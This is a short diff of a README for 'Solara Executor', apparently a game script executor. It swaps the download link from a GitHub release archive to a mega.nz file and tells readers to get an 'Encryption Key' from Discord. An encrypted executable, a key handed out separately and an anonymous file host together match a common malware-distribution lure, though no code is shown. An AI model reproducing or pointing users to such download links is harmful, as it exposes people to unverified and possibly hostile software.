@@ -2,7 +2,7 @@
 Solara Download
 
 # **Check the discord for the Encryption Key**
-# Solara Executor [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/waellaataoui/Solara-Executor/releases/download/Release/Update.rar)
+# Solara Executor [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://mega.nz/file/rFIyRZBa)
  
 
 ## Installation
